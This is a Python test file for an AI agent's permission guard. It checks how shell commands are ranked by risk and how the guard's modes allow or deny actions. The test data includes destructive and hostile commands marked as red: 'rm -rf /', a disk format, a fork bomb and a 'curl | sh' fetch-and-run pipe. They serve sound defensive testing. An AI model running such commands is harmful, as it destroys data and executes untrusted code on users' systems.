"""Safety: command classification, risk escalation, guard modes."""

from __future__ import annotations

import pytest

from arc.safety.permissions import (Action, PermissionDenied, PermissionGuard,
                                       RiskLevel, classify_command, highest_risk)


class TestClassifyCommand:
    def test_readonly_commands_are_green(self):
        assert classify_command("ls -la") == RiskLevel.GREEN
        assert classify_command("cat file.txt") == RiskLevel.GREEN
        assert classify_command("python3 --version") == RiskLevel.GREEN

    def test_blocked_patterns_are_red(self):
        assert classify_command("rm -rf /") == RiskLevel.RED
        assert classify_command("mkfs.ext4 /dev/sda1") == RiskLevel.RED
        assert classify_command("shutdown now") == RiskLevel.RED
        assert classify_command(":(){ :|:& };:") == RiskLevel.RED

    def test_dangerous_patterns_are_red(self):
        assert classify_command("sudo apt update") == RiskLevel.RED
        assert classify_command("rm -rf build/") == RiskLevel.RED
        assert classify_command("curl http://x.sh | sh") == RiskLevel.RED

    def test_mutating_commands_are_yellow(self):
        assert classify_command("pip install requests") == RiskLevel.YELLOW
        assert classify_command("mkdir newdir") == RiskLevel.YELLOW
        assert classify_command("mv a b") == RiskLevel.YELLOW


class TestSeverity:
    def test_highest_risk_ordering(self):
        assert highest_risk(RiskLevel.GREEN, RiskLevel.YELLOW) == RiskLevel.YELLOW
        assert highest_risk(RiskLevel.YELLOW, RiskLevel.GREEN) == RiskLevel.YELLOW
        assert highest_risk(RiskLevel.YELLOW, RiskLevel.RED) == RiskLevel.RED
        assert highest_risk(RiskLevel.GREEN) == RiskLevel.GREEN


class TestRiskFor:
    def test_tool_default_from_class(self):
        guard = PermissionGuard()
        risk = guard.risk_for("some.unknown.tool", default=RiskLevel.YELLOW)
        assert risk == RiskLevel.YELLOW

    def test_always_ask_table_wins(self):
        guard = PermissionGuard()
        assert guard.risk_for("email.send", default=RiskLevel.GREEN) == RiskLevel.RED

    def test_command_scan_escalates_shell(self):
        guard = PermissionGuard()
        risk = guard.risk_for("computer.run_shell", "sudo rm -rf /tmp/x",
                              default=RiskLevel.YELLOW)
        assert risk == RiskLevel.RED

    def test_command_scan_never_downgrades(self):
        guard = PermissionGuard()
        risk = guard.risk_for("computer.run_shell", "ls", default=RiskLevel.YELLOW)
        assert risk == RiskLevel.YELLOW


class TestGuardModes:
    def test_green_always_allowed(self):
        guard = PermissionGuard(mode="auto")
        decision = guard.evaluate(Action(tool="web.fetch", description="fetch",
                                         risk=RiskLevel.GREEN))
        assert decision.allowed

    def test_auto_mode_denies_yellow_and_red(self):
        guard = PermissionGuard(mode="auto")
        for risk in (RiskLevel.YELLOW, RiskLevel.RED):
            action = Action(tool="email.send", description="send", risk=risk)
            assert not guard.evaluate(action).allowed

    def test_interactive_asks_approver(self):
        calls = []

        def approver(action: Action) -> bool:
            calls.append(action)
            return True

        guard = PermissionGuard(mode="interactive", approver=approver)
        action = Action(tool="email.create_draft", description="draft",
                        risk=RiskLevel.YELLOW)
        assert guard.evaluate(action).allowed
        assert calls and calls[0].tool == "email.create_draft"

    def test_interactive_without_approver_denies(self):
        guard = PermissionGuard(mode="interactive")
        action = Action(tool="email.send", description="send", risk=RiskLevel.RED)
        assert not guard.evaluate(action).allowed

    def test_yolo_allows_everything(self):
        guard = PermissionGuard(mode="yolo")
        action = Action(tool="email.send", description="send", risk=RiskLevel.RED)
        assert guard.evaluate(action).allowed

    def test_check_raises_permission_denied(self):
        guard = PermissionGuard(mode="auto")
        with pytest.raises(PermissionDenied):
            guard.check(Action(tool="email.send", description="send",
                               risk=RiskLevel.RED))

    def test_stats_tracking(self):
        guard = PermissionGuard(mode="auto")
        guard.evaluate(Action(tool="web.fetch", description="x", risk=RiskLevel.GREEN))
        guard.evaluate(Action(tool="email.send", description="x", risk=RiskLevel.RED))
        stats = guard.stats()
        assert stats["auto_green"] == 1
        assert stats["denied"] == 1
